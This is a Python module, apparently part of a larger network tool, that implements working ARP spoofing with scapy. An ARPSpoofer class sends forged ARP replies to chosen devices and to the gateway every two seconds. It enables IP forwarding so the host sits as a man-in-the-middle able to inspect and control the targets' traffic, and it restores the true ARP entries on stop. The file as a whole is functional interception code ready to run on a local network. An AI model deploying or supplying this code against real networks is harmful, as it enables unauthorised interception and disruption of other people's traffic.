"""ARP spoofing module for traffic interception."""

import asyncio
import logging
from typing import Dict, Optional, Set
from dataclasses import dataclass

from scapy.all import ARP, Ether, sendp, getmacbyip, conf

from utils.mac_utils import normalize_mac
from utils.network_utils import enable_ip_forwarding, disable_ip_forwarding

logger = logging.getLogger(__name__)

# Suppress Scapy warnings
conf.verb = 0


@dataclass
class SpoofTarget:
    """Represents a device being ARP spoofed."""
    ip_address: str
    mac_address: str
    original_gateway_mac: str


class ARPSpoofer:
    """
    ARP spoofing manager for intercepting traffic.

    Positions this system as a man-in-the-middle between target devices
    and the gateway, allowing traffic inspection and control.
    """

    def __init__(
        self,
        interface: str,
        gateway_ip: str,
        gateway_mac: str,
        local_mac: str
    ):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.local_mac = local_mac

        self._targets: Dict[str, SpoofTarget] = {}  # MAC -> SpoofTarget
        self._spoof_task: Optional[asyncio.Task] = None
        self._running = False
        self._spoof_interval = 2  # seconds between ARP packets

    @property
    def active_targets(self) -> Set[str]:
        """Get set of MAC addresses being spoofed."""
        return set(self._targets.keys())

    def add_target(self, ip: str, mac: str) -> bool:
        """
        Add a device as a spoofing target.

        Args:
            ip: Target device IP address
            mac: Target device MAC address

        Returns:
            True if added successfully
        """
        normalized_mac = normalize_mac(mac)

        if normalized_mac in self._targets:
            logger.warning(f"Device {normalized_mac} already being spoofed")
            return False

        target = SpoofTarget(
            ip_address=ip,
            mac_address=normalized_mac,
            original_gateway_mac=self.gateway_mac
        )

        self._targets[normalized_mac] = target
        logger.info(f"Added spoofing target: {ip} ({normalized_mac})")

        # Send initial spoof packets
        self._send_spoof_packets(target)

        return True

    def remove_target(self, mac: str) -> bool:
        """
        Remove a device from spoofing and restore its ARP table.

        Args:
            mac: Target device MAC address

        Returns:
            True if removed successfully
        """
        normalized_mac = normalize_mac(mac)

        if normalized_mac not in self._targets:
            logger.warning(f"Device {normalized_mac} not being spoofed")
            return False

        target = self._targets.pop(normalized_mac)

        # Restore original ARP entries
        self._restore_arp(target)

        logger.info(f"Removed spoofing target: {target.ip_address} ({normalized_mac})")
        return True

    def _send_spoof_packets(self, target: SpoofTarget):
        """Send ARP spoof packets to target and gateway."""
        try:
            # Tell target: "I am the gateway"
            target_packet = Ether(dst=target.mac_address) / ARP(
                op=2,  # ARP reply
                psrc=self.gateway_ip,
                pdst=target.ip_address,
                hwdst=target.mac_address,
                hwsrc=self.local_mac
            )

            # Tell gateway: "I am the target"
            gateway_packet = Ether(dst=self.gateway_mac) / ARP(
                op=2,  # ARP reply
                psrc=target.ip_address,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                hwsrc=self.local_mac
            )

            sendp(target_packet, iface=self.interface, verbose=0)
            sendp(gateway_packet, iface=self.interface, verbose=0)

        except Exception as e:
            logger.error(f"Failed to send spoof packets for {target.ip_address}: {e}")

    def _restore_arp(self, target: SpoofTarget):
        """Restore original ARP entries for a target."""
        try:
            # Restore target's ARP table
            target_restore = Ether(dst=target.mac_address) / ARP(
                op=2,
                psrc=self.gateway_ip,
                pdst=target.ip_address,
                hwdst=target.mac_address,
                hwsrc=target.original_gateway_mac
            )

            # Restore gateway's ARP table
            gateway_restore = Ether(dst=self.gateway_mac) / ARP(
                op=2,
                psrc=target.ip_address,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                hwsrc=target.mac_address
            )

            # Send multiple times to ensure delivery
            for _ in range(5):
                sendp(target_restore, iface=self.interface, verbose=0)
                sendp(gateway_restore, iface=self.interface, verbose=0)

            logger.info(f"Restored ARP for {target.ip_address}")

        except Exception as e:
            logger.error(f"Failed to restore ARP for {target.ip_address}: {e}")

    async def start(self):
        """Start the ARP spoofing loop."""
        if self._running:
            logger.warning("ARP spoofer already running")
            return

        # Enable IP forwarding so traffic passes through
        if not enable_ip_forwarding():
            logger.error("Failed to enable IP forwarding")
            return

        self._running = True

        async def spoof_loop():
            while self._running:
                for target in list(self._targets.values()):
                    self._send_spoof_packets(target)

                await asyncio.sleep(self._spoof_interval)

        self._spoof_task = asyncio.create_task(spoof_loop())
        logger.info("ARP spoofer started")

    async def stop(self):
        """Stop ARP spoofing and restore all ARP tables."""
        self._running = False

        if self._spoof_task:
            self._spoof_task.cancel()
            try:
                await self._spoof_task
            except asyncio.CancelledError:
                pass
            self._spoof_task = None

        # Restore ARP for all targets
        for target in list(self._targets.values()):
            self._restore_arp(target)

        self._targets.clear()

        # Optionally disable IP forwarding
        # disable_ip_forwarding()

        logger.info("ARP spoofer stopped, all ARP tables restored")

    async def update_target_ip(self, mac: str, new_ip: str):
        """Update IP address for a target (e.g., after DHCP renewal)."""
        normalized_mac = normalize_mac(mac)

        if normalized_mac in self._targets:
            self._targets[normalized_mac].ip_address = new_ip
            logger.info(f"Updated IP for {normalized_mac}: {new_ip}")
